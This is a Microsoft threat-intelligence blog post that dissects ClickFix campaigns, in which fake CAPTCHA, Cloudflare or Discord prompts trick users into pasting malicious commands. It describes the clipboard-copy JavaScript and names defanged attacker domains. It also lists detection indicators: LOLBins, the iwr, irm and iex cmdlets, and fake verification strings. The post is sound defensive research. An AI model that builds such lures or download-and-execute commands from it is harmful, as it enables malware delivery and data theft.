<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow"><div class="entry-content wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
<p class="wp-block-paragraph">Over the past year, Microsoft Threat Intelligence and <a href="https://www.microsoft.com/en-us/security/business/services/microsoft-defender-experts-xdr">Microsoft Defender Experts</a> have observed the ClickFix social engineering technique growing in popularity, with campaigns targeting thousands of enterprise and end-user devices globally every day. Since early 2024, we’ve helped multiple customers across various industries address such campaigns attempting to deliver payloads like the prolific <a href="https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/">Lumma Stealer</a> malware. These payloads affect Windows and macOS devices and typically lead to information theft and data exfiltration.</p>



<p class="wp-block-paragraph">The ClickFix technique attempts to trick users into running malicious commands on their devices by taking advantage of their target’s tendency to solve minor technical issues and other seemingly benign interactions, such as human verification and CAPTCHA checks. It typically gives the users instructions that involve clicking prompts and copying, pasting, and running commands directly in the Windows <em>Run</em> dialog box, Windows Terminal, or Windows PowerShell. It’s often combined with delivery vectors such as phishing, malvertising, and drive-by compromises, most of which even <a href="https://www.microsoft.com/en-us/security/blog/2025/03/13/phishing-campaign-impersonates-booking-com-delivers-a-suite-of-credential-stealing-malware/">impersonate legitimate brands</a> and organizations to further reduce suspicion from their targets.</p>



<p class="wp-block-paragraph">Because ClickFix relies on human intervention to launch the malicious commands, a campaign that uses this technique could get past conventional and automated security solutions. Organizations could thus reduce the impact of this technique by educating users in recognizing its lures and by implementing policies that will harden the device configurations in their environment (for example, disallowing users to use the <em>Run</em> dialog if it’s not necessary in their daily tasks). Microsoft Defender XDR also provides a comprehensive set of protection features that detect this threat at various stages of the attack chain.</p>



<p class="wp-block-paragraph">This blog discusses the different elements that make up a ClickFix campaign—from the arrival vectors it comes with to its various implementations—and provides different examples of threat campaigns we’ve observed to further illustrate these elements. We also provide recommendations and detection details to surface and mitigate this threat.</p>



<h2 class="wp-block-heading" id="the-clickfix-attack-chain">The ClickFix attack chain</h2>



<p class="wp-block-paragraph">A typical ClickFix attack begins with threat actors using phishing emails, malvertisements, or compromised websites to lead unsuspecting users to a visual lure—usually a landing page—and trick them into executing a malicious command themselves. By adding this user interaction element in the attack chain, a threat using the ClickFix technique could slip through conventional and automated security solutions.</p>



<p class="wp-block-paragraph">Microsoft Threat Intelligence observed threat actors adapting and improving certain elements of the technique to further evade detection. For example, threat actors obfuscate the JavaScript that generates the visual lures or they download parts of the code from different servers. They also employ various tactics in obfuscating malicious commands. We discuss these stages of the attack chain in detail in the succeeding sections of this blog.</p>



<p class="wp-block-paragraph">Once the malicious command is run by the user, malware is downloaded into the target device. We’ve observed numerous threat actors that leverage ClickFix attacks deliver the following:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item">Infostealers like <a href="https://thecyberwire.com/podcasts/microsoft-threat-intelligence/49/notes">LummaStealer</a>, which appears to be the most prolific ClickFix final payload based on our observations and threat hunting investigations &nbsp;</li>



<li class="wp-block-list-item">Remote access tools (RATs) such as Xworm, AsyncRAT, NetSupport, and SectopRAT, which could allow threat actors to conduct hands-on keyboard activity like discovery, lateral movement, and persistence</li>



<li class="wp-block-list-item">Loaders like Latrodectus and MintsLoader, which could deliver additional malware and other payloads</li>



<li class="wp-block-list-item">Rootkits, such as a modified version of the open source r77, which could allow threat actors to employ several sophisticated persistence and defense evasion tactics and remain deeply embedded in a victim system</li>
</ul>



<p class="wp-block-paragraph">These final payloads are often “fileless”, that is, they’re seldom written to disk as a Windows executable (<em>.exe</em> or <em>.dll</em>) file. Instead, they’re loaded and launched in memory by living-off-the-land binaries (LOLBins), often as a .NET assembly or Common Language Runtime (CLR) module. However, whether the malware is on disk or in memory, we’ve observed its code injected into LOLBins, such as <em>msbuild.exe</em>, <em>regasm.exe</em>, or <em>powershell.exe</em>.</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig1-Typical-ClickFix-attack-chain-1.webp" alt="Diagram showing the typical ClickFix attack chain " class="wp-image-141844 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig1-Typical-ClickFix-attack-chain-1.webp"><figcaption class="wp-element-caption">Figure 1. The typical ClickFix attack chain</figcaption></figure>



<h3 class="wp-block-heading" id="case-study-lampion-malware-campaign">Case study: Lampion malware campaign</h3>



<p class="wp-block-paragraph">To illustrate a typical ClickFix attack chain, let’s look at a campaign we first identified in May 2025 targeting Portuguese organizations in government, finance, and transportation sectors to deliver Lampion malware, an&nbsp;infostealer&nbsp;focused on banking information. This campaign has since been observed in other countries—including Portugal, Switzerland, Luxembourg, France, Hungary, and Mexico—targeting organizations in the government, education, transportation, and financial services industries.&nbsp;As of June 2025, this campaign remains active.</p>



<p class="wp-block-paragraph">The&nbsp;Lampion malware campaign&#8217;s ClickFix lures, obfuscation methods, and multi-stage infection process are designed to evade detection:</p>



<ol class="wp-block-list">
<li class="wp-block-list-item">The threat actor sends phishing emails containing a ZIP file, which when opened, contains an HTML file that redirects target users to a fake Portuguese tax authority site where the ClickFix lure is hosted.</li>



<li class="wp-block-list-item">The ClickFix lure tricks users into launching a PowerShell command that downloads an obfuscated VBScript (<em>.vbs</em>).</li>



<li class="wp-block-list-item">The downloaded script then writes a second obfuscated <em>.vbs</em> file to the Windows <em>%TEMP%</em> directory and schedules it to run later using a hidden task.</li>



<li class="wp-block-list-item">This&nbsp;second <em>.vbs</em> file downloads a third and much larger <em>.vbs</em> file that performs reconnaissance, checks for antivirus or sandbox environments, and sends system data to a command-and-control (C2) server.</li>



<li class="wp-block-list-item">The third script also creates a <em>.cmd</em> file in the Windows startup folder, naming it after the user&#8217;s hostname, and schedules a system restart.</li>



<li class="wp-block-list-item">After the device restarts, the <em>.cmd</em> file launches a large DLL through <em>rundll32.exe</em> and attempts to deliver the final payload.</li>
</ol>



<p class="wp-block-paragraph">However, during our investigation, the actual Lampion malware wasn’t delivered because the download command was commented out of the code.</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig2-Lampion-ClickFix-attack-chain.webp" alt="Diagram showing the Lampion infection chain using the ClickFix technique" class="wp-image-141845 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig2-Lampion-ClickFix-attack-chain.webp"><figcaption class="wp-element-caption">Figure 2. Lampion infection chain</figcaption></figure>



<h2 class="wp-block-heading" id="before-the-click-arrival-vectors">Before the click: Arrival vectors</h2>



<p class="wp-block-paragraph">Threat actors leveraging ClickFix rely on a variety of methods to lure unwitting users. We’ve observed three primary avenues where a user could encounter a ClickFix prompt: by receiving phishing emails, encountering a malicious ad, or by visiting a compromised or malicious website.</p>



<h3 class="wp-block-heading" id="phishing">Phishing</h3>



<p class="wp-block-paragraph">Microsoft Threat Intelligence first observed the use of the ClickFix technique between March and June 2024 in email campaigns sent by a threat actor we track as Storm-1607. These emails contained HTML attachments that attempted to install DarkGate, a commodity loader that is capable of keylogging, cryptocurrency mining, establishing C2 communications, and downloading additional malicious payloads, among others.</p>



<p class="wp-block-paragraph">One of Storm-1607’s campaigns observed in May 2024 consisted of tens of thousands of emails targeting organizations in the United States (US) and Canada. These emails used payment and invoice lures and contained attachments with file names like <em>reports_528647.html</em>:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig3-Storm-1607-phishing-email.webp" alt="Screenshot of a phishing email" class="wp-image-141846 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig3-Storm-1607-phishing-email.webp"><figcaption class="wp-element-caption">Figure 3. Storm-1607 phishing email</figcaption></figure>



<p class="wp-block-paragraph">When opened, the HTML loaded a page with a fake Microsoft Word new document image and a dialog box showing an error message and prompting the user to click the <strong>How to fix</strong> button:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig4-HTML-attachment.webp" alt="Screenshot of HTML attachment showing a Microsoft Word background and ClickFix lure" class="wp-image-141847 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig4-HTML-attachment.webp"><figcaption class="wp-element-caption">Figure 4. HTML attachment displaying a Microsoft Word background and ClickFix lure</figcaption></figure>



<p class="wp-block-paragraph">Clicking the button copied the malicious code on the user’s clipboard in the background. Meanwhile, the dialog box added new instructions that explained to the user how to open Windows Terminal and paste the malicious code into it:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig5-ClickFix-lure.webp" alt="Screenshot of ClickFix lure displaying further insructions" class="wp-image-141848 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig5-ClickFix-lure.webp"><figcaption class="wp-element-caption">Figure 5. ClickFix lure displaying further instructions</figcaption></figure>



<p class="wp-block-paragraph">While other threat actors also use invoice or payment lures in their phishing campaigns, as of this writing, including HTML attachments in the emails is no longer the preferred method to implement the ClickFix technique. Instead, threat actors now include in their phishing email a URL that points to a ClickFix landing page. For example, in March 2025, we observed a threat actor tracked as Storm-0426 launch a campaign consisting of thousands of phishing emails that targeted users in Germany and attempted to install MintsLoader. The emails used payment and invoice lures purportedly from a web hosting provider and contained URLs leading to the Prometheus traffic direction system (TDS) hosted on numerous compromised sites:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig6-Storm-0426-phishing-email.webp" alt="Screenshot of a phishing email" class="wp-image-141849 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig6-Storm-0426-phishing-email.webp"><figcaption class="wp-element-caption">Figure 6. Storm-0426 phishing email</figcaption></figure>



<p class="wp-block-paragraph">The TDS redirected users to the attacker-controlled website <em>mein-lonos-cloude[.]de</em>, where the ClickFix technique instructed the users to complete a human verification process by following the displayed instructions, which launched a malicious code:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig7-ClickFix-landing-page.webp" alt="Screenshot of a ClickFix landing page" class="wp-image-141850 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig7-ClickFix-landing-page.webp"><figcaption class="wp-element-caption">Figure 7. ClickFix landing page</figcaption></figure>



<p class="wp-block-paragraph">Another example of a phishing campaign using URLs and redirectors was observed in June 2025, where the campaign impersonated the US Social Security Administration (SSA) and used a combination of social engineering and domain spoofing to deliver ScreenConnect, a legitimate remote management tool that has become increasingly abused by threat actors. Once installed, ScreenConnect could give an attacker full remote control over a victim’s system, enabling them to exfiltrate data, install additional malware, or conduct surveillance.</p>



<p class="wp-block-paragraph">The campaign began with emails sent from a legitimate but compromised Brazilian domain. The message, which even included legitimate links to SSA’s official social media accounts in the footer, claimed that there was an issue with the recipient’s social security statement. Like other phishing emails, these characteristics and tactics were all attempts by the threat actor to bypass spam filters, lend credibility and reduce suspicion to the message, and prompt the user to take immediate action:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig8-Phishing-email.webp" alt="Screenshot of phishing email impersonating SSA" class="wp-image-141851 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig8-Phishing-email.webp"><figcaption class="wp-element-caption">Figure 8. Phishing email impersonating the US SSA</figcaption></figure>



<p class="wp-block-paragraph">The message’s call-to-action button, labeled <strong>Download Statement</strong>, was also particularly deceptive because instead of linking directly to a malicious site, it used a Google Ads URL redirect to obfuscate the final destination. This technique not only helped the email pass through conventional email security solutions, it also undermined an email best practice (hovering over the links before clicking to determine if the URL displayed points to the intended site or not) users are typically taught as part of their security awareness trainings.</p>



<p class="wp-block-paragraph">When a user clicked the <strong>Download Statement</strong> button, they were redirected to a spoofed SSA website hosted on a Spanish top-level domain (<em>access-ssa-gov[.]es</em>). The site closely mimicked the real SSA home page, including a blurred background image of the legitimate site to create a false sense of familiarity and trust:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig9-ClickFix-landing-page.webp" alt="Screenshot of ClickFix landing page impersonating SSA" class="wp-image-141852 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig9-ClickFix-landing-page.webp"><figcaption class="wp-element-caption">Figure 9. ClickFix landing page impersonating the US SSA</figcaption></figure>



<p class="wp-block-paragraph">The landing page presented the user with a CAPTCHA human verification pop-up, which was part of the ClickFix technique. Behind the scenes, this interaction triggered a series of fake verification steps designed to guide the user into running a PowerShell script that would eventually download and launch the ScreenConnect payload:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig10-ClickFix-instructions.webp" alt="ClickFix instructions from the spoofed SSA domain" class="wp-image-141853 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig10-ClickFix-instructions.webp"><figcaption class="wp-element-caption">Figure 10. ClickFix instructions from the spoofed US SSA domain</figcaption></figure>



<h3 class="wp-block-heading" id="malvertising">Malvertising</h3>



<p class="wp-block-paragraph">Malvertising is another popular delivery method that leads to ClickFix landing pages. In a campaign observed in April 2025, users who attempted to stream free or pirated movies on certain websites inadvertently launched a variety of scam pages in a new browser tab when they interacted with a movie (for example, by pressing the play button):</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig11-Free-moving-streaming-site.webp" alt="Screenshot of a free moving streaming website" class="wp-image-141854 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig11-Free-moving-streaming-site.webp"><figcaption class="wp-element-caption">Figure 11. Example of a free movie streaming website</figcaption></figure>



<p class="wp-block-paragraph">One of these scam pages was a ClickFix landing page that downloaded and installed Lumma Stealer:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig12-Click-fix-landing-page.webp" alt="Screenshot of a ClickFix landing page " class="wp-image-141857 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig12-Click-fix-landing-page.webp"><figcaption class="wp-element-caption">Figure 12. ClickFix landing page the users were redirected to if they clicked the &ldquo;Play&rdquo; button on the free movie website</figcaption></figure>



<p class="wp-block-paragraph">This activity cluster is notable because it renamed the various intermediate HTA scripts to media format extensions such as <em>.mp3</em>, <em>.mp4</em>, or <em>.ogg</em>. It’s also notable for its high traffic volumes: in a single day, tens of thousands, if not hundreds of thousands, of unique visitors could be funneled to scam pages (including the ClickFix landing page) through the malvertising redirectors. </p>



<h3 class="wp-block-heading" id="drive-by-compromise">Drive-by compromise</h3>



<p class="wp-block-paragraph">Some threat actors have also been observed to leverage compromised websites to deliver the ClickFix landing page. For example, the threat actor we track as Storm-0249 has traditionally used email to deliver Latrodectus or other initial access malware—whether by using <a href="https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/">PDF files</a> or URL links (sometimes <a href="https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice">copyright infringement</a>-themed). However, since the beginning of March 2025, Storm-0249 switched to compromising legitimate websites, potentially through WordPress vulnerabilities, and using the ClickFix technique to deliver its payloads.</p>



<p class="wp-block-paragraph">When a user visits the compromised site, the original page is briefly displayed before it’s replaced with the ClickFix human verification lure. This specific lure even spoofs Cloudflare to further trick users into thinking that the verification step is legitimate:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig13-ClickFix-impersonation-1.webp" alt="Screenshot of a ClickFix lure spoofing Cloudflare Turnstile" class="wp-image-141881 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig13-ClickFix-impersonation-1.webp"><figcaption class="wp-element-caption">Figure 13. ClickFix lure spoofing Cloudflare Turnstile on a compromised site</figcaption></figure>



<h2 class="wp-block-heading" id="inside-the-click-clickfix-implementations">Inside the click: ClickFix implementations</h2>



<p class="wp-block-paragraph">ClickFix operators use several methods to attempt to convince a target to perform user-level command execution on their system. Early landing pages mimicked Google’s “<a href="https://support.google.com/chrome/answer/95669?hl=en&amp;co=GENIE.Platform=Desktop">Aw, Snap!</a>” crash error or Word Online extension missing message (as depicted in Figure 4), while recent ones spoof Google’s <a href="https://developers.google.com/recaptcha/">reCAPTCHA</a> and Cloudflare’s <a href="https://www.cloudflare.com/application-services/products/turnstile/">Turnstile</a> solution. We’ve even observed threat actors spoof social media platforms like Discord to trick users into believing they’re joining an actual Discord server. Many elements go into building ClickFix lure pages—from JavaScript inline frames (iframes) and HTML <em>href</em> codes to cascading style sheets (CSS) resources—to make them more legitimate-looking.</p>



<p class="wp-block-paragraph">There are various ways that ClickFix is implemented: some implementations are contained in one file or page, while others use remote resources. Some threat actors leave code comments amateurishly while others obfuscate their code. There are even implementations that report the status of an infection to a Telegram channel or a web server. We provide a few examples of these implementations and discuss their inner workings.</p>



<h3 class="wp-block-heading" id="impersonating-cloudflare-turnstile">Impersonating Cloudflare Turnstile</h3>



<p class="wp-block-paragraph">Figure 14 shows a partial screenshot of a ClickFix landing page, <em>binancepizza[.]info</em>, displaying a seemingly legitimate Cloudflare Turnstile verification process that a user is lured to interact with before they can supposedly access the site:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig14-landing-page.webp" alt="Screenshot of ClickFix landing page" class="wp-image-141858 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig14-landing-page.webp"><figcaption class="wp-element-caption">Figure 14. The ClickFix landing page binancepizza[.]info</figcaption></figure>



<p class="wp-block-paragraph">Its HTML source code clones this Cloudflare Turnstile style page using a <em>href</em> attribute to a CSS resource hosted by the Font Awesome library:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig15-HTML-code.webp" alt="Screenshot of HTML code " class="wp-image-141859 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig15-HTML-code.webp"><figcaption class="wp-element-caption">Figure 15. HTML code highlighting a CSS resource for a Cloudflare verification prompt</figcaption></figure>



<p class="wp-block-paragraph">The page also references an HTML file (<em>field.html</em>) using a hidden iframe:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig16-HTML-code.webp" alt="Screenshot of HTML code" class="wp-image-141860 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig16-HTML-code.webp"><figcaption class="wp-element-caption">Figure 16. HTML code highlighting hidden iframe and text needing to &ldquo;verify&rdquo;</figcaption></figure>



<p class="wp-block-paragraph">Within <em>field.html</em>, we see in Figure 17 that <em>contentEl</em>is the iframe element representing the fake Cloudflare Turnstile verification check box. When a user ticks the <strong><em>Verify you are human</em></strong> check box, this script animates a fake spinner through <em>runVerification()</em>and sends <em>postMessage(&#8220;trigger&#8221;)</em> to the parent window (the main landing page).</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig17-HTML-code-iframe.webp" alt="Screenshot of JavaScript code" class="wp-image-141861 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig17-HTML-code-iframe.webp"><figcaption class="wp-element-caption">Figure 17. JavaScript code of iframe field.html, highlighting elements that send a trigger message upon verification click</figcaption></figure>



<p class="wp-block-paragraph">The user is then presented with the ClickFix instructions (Figure 18), while the obfuscated command is copied to the user&#8217;s clipboard (Figure 19):</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig18-ClickFix-instructions.webp" alt="Screenshot of ClickFix instructions" class="wp-image-141862 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig18-ClickFix-instructions.webp"><figcaption class="wp-element-caption">Figure 18. ClickFix instructions from binancepizza[.]info</figcaption></figure>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig19-JavaScript-code.webp" alt="Screenshot of malicuous command" class="wp-image-141863 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig19-JavaScript-code.webp"><figcaption class="wp-element-caption">Figure 19. Malicious command copied to clipboard</figcaption></figure>



<p class="wp-block-paragraph">Figure 20 shows that the clipboard copy occurs once the code receives the message “trigger”, which is sent by the <em>field.html</em> hidden iframe. Once that message is received, the script uses <em>navigator.clipboard.writeText(codeToCopy)</em> to copy the command to the clipboard.</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig20-JavaScript-code.webp" alt="Screenshot of JavaScript code" class="wp-image-141864 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig20-JavaScript-code.webp"><figcaption class="wp-element-caption">Figure 20. JavaScript code highlighting the method navigator.clipboard.writeText, which copies a malicious command to clipboard</figcaption></figure>



<h3 class="wp-block-heading" id="impersonating-social-platforms">Impersonating social platforms</h3>



<p class="wp-block-paragraph">It&#8217;s important to note that not all ClickFix landing pages are designed in the same manner and might not strictly contain the elements discussed previously. In some instances, threat actors also mimic popular social platforms to broaden their reach of potential targets.</p>



<p class="wp-block-paragraph">Figure 21 shows a ClickFix landing page spoofing a Discord server supposedly needing to verify a user before they can join:</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig21-Fake-Discord-server.webp" alt="Screenshot of Fake Discord page implementing ClickFix" class="wp-image-141865 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig21-Fake-Discord-server.webp"><figcaption class="wp-element-caption">Figure 21. Fake Discord server landing page implementing ClickFix.</figcaption></figure>



<p class="wp-block-paragraph">In this page’s source code (Figure 22), we can see it referencing the Discord logo image file to appear legitimate. Additionally, the<em>addEventListener</em> method waits for the <strong>Verify</strong> button to get clicked (through <em>verifyBtn</em>) so <em>navgiator.clipboard.writetext(command)</em> can copy the malicious command to the user’s clipboard. This JavaScript method is a Clipboard API that allows for accessing the operating system (OS) clipboard. Older pages might use <em>document.execCommand()</em>, which is now deprecated.</p>



<p class="wp-block-paragraph">The fake Discord landing page differs from the previous example because the reference of an external trigger (from the hidden iframe) isn’t used here. Instead, the click then copy is all processed from the main window. Based on our analysis, this landing page also appears to be part of the <a href="https://www.securonix.com/blog/analyzing-obscurebat-threat-actors-lure-victims-into-executing-malicious-batch-scripts-to-deploy-stealthy-rootkits/">OBSCURE#BAT</a> campaign delivering r77 rootkit.</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig22-HTML-code.webp" alt="Screenshot of HTML code" class="wp-image-141866 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig22-HTML-code.webp"><figcaption class="wp-element-caption">Figure 22. HTML code highlighting use of Discord logo and JavaScript elements that copy a malicious command to clipboard upon clicking &ldquo;verify&rdquo;</figcaption></figure>



<h2 class="wp-block-heading" id="the-fix-user-level-code-execution">The “fix”: User-level code execution</h2>



<p class="wp-block-paragraph">The ClickFix technique typically presents its “fix” by instructing users to run malicious commands or code in the Windows <em>Run</em> dialog box. We assess that the threat actors who use this technique are banking on the idea that most of their targets aren’t familiar with this Windows OS component and what it’s used for, unlike the more advanced users doing system administrator tasks. Early ClickFix lures instructed users to run commands manually and directly in Windows Terminal or Windows PowerShell. However, multiple line warnings might have deterred potential victims from running these commands, leading to the threat actors changing their tactics.</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig23-Multiple-line-warning.webp" alt="Screenshot of multiple line warning in Windows Terminal" class="wp-image-141867 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig23-Multiple-line-warning.webp"><figcaption class="wp-element-caption">Figure 23. Example of a multiple line warning in Windows Terminal</figcaption></figure>



<h3 class="wp-block-heading" id="detecting-windows-run-dialog-misuse">Detecting Windows Run dialog misuse</h3>



<p class="wp-block-paragraph">The Windows <em>Run</em> dialog (<em>Win</em> + <em>R</em>) is a trusted shell input user interface (UI) that’s part of Windows Explorer (<em>explorer.exe</em>). Internally, it uses <em>ShellExecute</em> or <em>CreateProcess</em> APIs to resolve and launch commands. The input is limited to <em>MAX_PATH</em>, requiring a null-terminated string (<em>\0</em>) with a practical maximum of 259 characters. Additionally, as part of the <em>Run</em> dialog, Windows loads <em>tiptsf.dll</em> module in <em>explorer.exe</em>. This DLL file is related to the Text Services Framework (TSF), which provides input processor interface.</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig24-Windows-Run-dialog-box.webp" alt="Screenshot of Windows Run" class="wp-image-141868 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig24-Windows-Run-dialog-box.webp"><figcaption class="wp-element-caption">Figure 24. The Windows Run dialog box</figcaption></figure>



<p class="wp-block-paragraph">Entering commands into the <em>Run</em> dialog leaves forensic traces—most notably in the <em>RunMRU</em>(Most Recently Used) registry key. This key keeps a history of <em>Run</em> dialog executions and can be used to reconstruct user-initiated activity during investigations. Note that it doesn’t create a registry entry if the process execution fails.</p>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig25-RunMRU-registry.webp" alt="Screenshot of registry" class="wp-image-141869 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig25-RunMRU-registry.webp"><figcaption class="wp-element-caption">Figure 25. RunMRU registry key entry with a malicious ClickFix command</figcaption></figure>



<p class="wp-block-paragraph">To determine if a ClickFix command execution is potentially occurring in the environment, one can check the RunMRU entries if they include signs pointing to LOLBins—such as <em>powershell</em>, <em>mshta</em>, <em>rundll32</em>, <em>wscript</em>, <em>curl</em>, and <em>wget</em>—that can execute code and/or download payloads. PowerShell continues to be the most leveraged native binary, with cmdlets such as <em>iwr</em> (<em>Invoke-WebRequest</em>), <em>irm</em> (<em>Invoke-RestMethod</em>), and <em>iex</em> (<em>Invoke-Expression</em>) being very prolific.</p>



<p class="wp-block-paragraph">&nbsp;Additional suspicious elements to check in entries within the <em>RunRMU</em> registry key include the following:</p>



<ul class="wp-block-list">
<li class="wp-block-list-item">First-stage payloads are often hosted by direct IP addresses, content delivery network (CDN) domains, interesting top-level domains (for example, <em>.live</em>,<em>. shop</em>, <em>.icu</em>), or code-sharing platforms such as pastes.</li>



<li class="wp-block-list-item">First-stage payloads are often delivered and/or launched as specific file type such as <em>.html</em>, <em>.hta</em>, <em>.txt</em>, <em>.zip</em>, <em>.msi</em>, <em>.bat</em>, <em>.ps1</em>, or <em>.vbs</em><ul><li>The file type of the scripts might be renamed to media extensions (such as <em>.png</em>, <em>.mp3</em>, <em>.mp4</em>, <em>.wav</em>, and <em>.jpg</em>) to hide their true intent.</li></ul>
<ul class="wp-block-list">
<li class="wp-block-list-item">The file type might employ double file extension for evasion (for example, <em>file.hta.mp4</em>)</li>
</ul>
</li>



<li class="wp-block-list-item">URLs are often shortened using shorteners such as Bitly.</li>



<li class="wp-block-list-item">A fake reCAPTCHA, CAPTCHA, or Turnstile confirmation is included, such as the following:<ul><li>✅ “I am not a robot &#8211; reCAPTCHA Verification ID: XXXX”</li></ul><ul><li># # I am not a robot: CAPTCHA Verification UID: XXXX\</li></ul><ul><li># “Human, not a robot: CAPTCHA: Verification ID: XXXX”</li></ul>
<ul class="wp-block-list">
<li class="wp-block-list-item">✔️ “Cloud identificator:XXXX”</li>
</ul>
</li>
</ul>


<figure class="wp-block-image size-full"><img decoding="async" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig26-Generic-ClickFix-commands.webp" alt="Screenshot of ClickFix commands" class="wp-image-141870 webp-format" srcset="" data-orig-src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/08/Fig26-Generic-ClickFix-commands.webp"><figcaption class="wp-element-caption">Figure 26. Examples of generic ClickFix commands</figcaption></figure>



<h3 class="wp-block-heading" id="obfuscation-and-execution-techniques-for-defense-evasion">Obfuscation and execution techniques for defense evasion</h3>



<p class="wp-block-paragraph">The command examples in the previous section aren’t all encompassing, as we’ve observed threat actors employing a growing number of obfuscation and execution techniques for defense evasion. These techniques include nested execution chains, proxy command abuse, encoding schemes such as Base64, use of string concatenation/fragmentation, and escaped characters, among others.</p>


